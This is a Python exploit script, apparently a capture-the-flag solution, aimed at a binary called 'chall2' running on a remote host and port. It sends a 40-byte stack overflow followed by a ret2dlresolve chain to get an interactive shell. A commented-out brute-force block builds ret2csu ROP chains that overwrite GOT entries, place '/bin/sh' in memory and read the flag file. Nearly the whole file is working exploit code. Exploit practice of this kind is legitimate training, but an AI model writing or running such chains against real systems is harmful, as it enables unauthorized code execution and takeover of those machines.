#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./chall2')

host = args.HOST or '3.99.48.161'
port = int(args.PORT or 9004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *__libc_csu_init+65
continue
'''.format(**locals())

# -- Exploit goes here --
# context.log_level = 'critical'

io = start()
r2dl = Ret2DLResolve()
rop = b"A"*40 + r2dl[0]
s(rop)
pause()
s(r2dl[1])

io.interactive()

# for i in range(0x0, 0xff+1):
#     try:
#         # i=0x2b
#         io = start()
#         mov_eax_0_ret = 0x000000004011a3
#         rop1 = b'a'*40 + ret2csu(what=exe.got.read, rdx=0x1337, rdi=0, rsi=0x404018, junk = 0x0) + p64(mov_eax_0_ret) + p64(0xdeadbeef) + ret2csu(what=exe.got.read, rdx=0x1337, rdi=0x0, rsi=exe.got.sleep) + ret2csu(what=exe.got.read, rdx=0x0, rdi=exe.got.sleep+8)
#         s(rop1)
#         sleep(1)
#         s( '\x16\x10@\x00\x00\x00\x00\x00' + chr(i))
#         sleep(1)
#         rop2 = b'a'*40 + ret2csu(what=exe.got.read, rdx=0x1337, rdi=1, rsi=0x404020)
#         kekw = p64(0x00000000401016) + b"/bin/sh\x00"
#         s( kekw.ljust(0x3b, b'\x00') )
#         sleep(1)
#         sl("cat fla*")
#         print(re())
#         io.interactive()
#     except :
#         print(hex(i), "failed")
#         # io.close()